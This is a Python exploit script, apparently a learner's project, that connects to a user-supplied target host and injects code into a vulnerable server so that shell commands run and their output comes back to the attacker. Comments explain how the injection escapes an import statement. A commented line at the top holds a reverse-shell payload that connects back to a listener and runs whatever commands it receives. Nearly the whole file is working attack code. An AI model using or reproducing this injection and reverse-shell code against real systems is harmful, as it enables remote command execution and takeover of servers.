import socket
#While loop not working for some reason. I'll work on it later : b"import socket,subprocess,time;time.sleep(5); sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); ip = '127.0.0.1'; port = 4242; sock.connect((ip, port)); while True: data = sock.recv(1024); data = data.decode(); output = subprocess.check_output(data, shell=True); sock.send(output);"
##################################################################################
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#Initiates 's' as a socket object, using the AF_INET and SOCK_STREAM types.
######################################
#Getting Input From The User
ip = input("IP Of Target : ")
port = input("Port Of Target : ")
try:
    #Checking if the port is a valid integer
    port = int(port)
except:
    print("Invalid Port Number")
try:
    #Tries To Connect To Target
    s.connect((ip, port))
    print("Connected Successfully")
except:
    print("Failed To Connect To Target")
command = input("Command To Send : ")
#Encodes The command into bytes format so it can be sent through a socket
command = command.encode()
fullCommand = b"subprocess,time;time.sleep(5);result = subprocess.check_output('"+command+b"',shell=True); conn.send(result)"
print("Sending Command...")
# Here's what's this  code is doing :
# subprocess,time : Since the vulnerable code is already using an import statement, we can just place the libraries we want to import at the start of the data we're sending to import them, and then add a ';' to escape the rest of the statement
# time.sleep(5) : Giving the listener some time to work.
# result = subprocess.check_output('"+command+b"',shell=True) : Using subprocess to check the output of the specified command.
# conn.send(result) : The vulnerable code has a variable called 'conn', which handles the sending and receiving of the data between the server (the vulnerable server) and the client (the attacker). Since we're injecting code into the application, we can just tell the 'conn' object to send us the output of the command, and we don't need to set up a listener sice we're already connected to 'conn'.
#
#Each line is split up by a ';' to specify that it is a new command.
#The 'b' at the start of the strings specify that they should be bytes, which can be sent through a socket connection.
#
#Sending The Exploit
s.send(fullCommand)
print("Sent Command! Receiving Output...\n")
#Receiving The Output Of The Exploit Where The Maximum Size It Can Receive Is 100000 Bytes
data = s.recv(100000)
#Printing The Output
print(data.decode())
#Finished!
input("\nPress Any Key To Exit : ")

